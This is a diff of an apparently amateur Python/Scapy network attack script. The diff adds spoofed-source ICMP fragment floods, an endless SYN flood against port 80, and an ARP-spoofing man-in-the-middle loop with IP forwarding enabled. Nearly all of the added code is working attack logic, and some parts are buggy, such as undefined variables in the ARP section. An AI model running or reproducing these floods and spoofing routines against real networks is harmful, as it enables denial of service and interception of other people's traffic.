@@ -14,6 +14,7 @@ parser = argparse.ArgumentParser()
 # Adding optional argument
 parser.add_argument("-i", "--ip", help = "Destination IP Address")
 parser.add_argument("-s", "--source", help = "Source IP Address")
+parser.add_argument("--host", help = "Host IP Address")
 parser.add_argument("--icmp", help = "ICMP Flood")
 parser.add_argument("--syn", help = "SYN Flood")
 parser.add_argument("--arp", help = "ARP Spoofing")
@@ -34,25 +35,53 @@ def thread_delay(thread_name, delay, ip):
 
 	if args.source:
 		print("Diplaying source as: % s" % args.source)
-		ip_layer = IP(dst=ip, src=args.source)
+		ip_layer = IP(dst=args.ip, src=args.source)
 	else:
-		ip_layer = IP(dst=ip)
+		ip_layer = IP(dst=args.ip, src=RandIP("192.168.10.10/24"))
 
-	if args.protocol:
-		print("Diplaying protocol as: % s" % args.protocol)
-
-		layer = eval(args.protocol.upper() + "()")
-
-	else:
-		layer = ICMP()
-
-	packet = ip_layer / layer
 
 	if args.number:
-		send(packet, count=int(args.number))
+		numPackets = args.number
 
 	else:
-		send(packet, loop=1)
+		numPackets = 50
+
+	if args.icmp:
+ 		send(numPackets*(fragment(ip_layer/ICMP()/"X"*60000)))
+
+	if args.syn:
+		tcp=TCP(sport=RandShort(), dport=80, flags="S")
+		raw=Raw(b"x"*1024)
+		p=ip_layer/tcp/raw
+		print("Sending packets... Press CTRL+C to stop.")
+
+		send(p, loop=1, verbose=0)
+
+	if args.arp:
+		if args.host: #METER UM ELSE A DIZER QUE ESTE HOST É OBRIGATORIO NO ARP
+			try:
+				gtw = ipaddress.ip_address(args.host)
+			except:
+				print('Address/netmask is invalid: %s' % args.host)
+				exit(1)
+
+			verbose = True
+			enable_ip_route()
+			try:
+				while True:
+					#telling the target that we are the host
+					spoof(ip, host, verbose)
+					#telling the host that we are the target
+					spoof(host, ip, verbose)
+					time.sleep(1)
+			except KeyboardInterrupt:
+				print("[!] Detected CTRL+C ! restoring the network, please wait...")
+				restore(target, host)
+				restore(host, target)
+		else:
+			print("Host IP address in mandatory!")
+			exit(1)
+	
 
 
 #enable ip route (ip forward) in linux-based distro
@@ -128,18 +157,6 @@ if args.ip:
 	else:
 		ip_layer = IP(dst=args.ip, src=RandIP("192.168.10.10/24"))
 
-	"""
-	if args.protocol:
-		print("Diplaying protocol as: % s" % args.protocol)
-
-		layer = eval(args.protocol.upper() + "()")
-
-	else:
-		layer = ICMP()
-
-	packet = ip_layer / layer
-
-	"""
 
 	if args.number:
 		numPackets = args.number
@@ -155,6 +172,8 @@ if args.ip:
 		tcp=TCP(sport=RandShort(), dport=80, flags="S")
 		raw=Raw(b"x"*1024)
 		p=ip_layer/tcp/raw
+		print("Sending packets... Press CTRL+C to stop.")
+
 		send(p, loop=1, verbose=0)
 
 	if args.arp:
@@ -178,6 +197,9 @@ if args.ip:
 				print("[!] Detected CTRL+C ! restoring the network, please wait...")
 				restore(target, host)
 				restore(host, target)
+		else:
+			print("Host IP address in mandatory!")
+			exit(1)
 			
 	
 
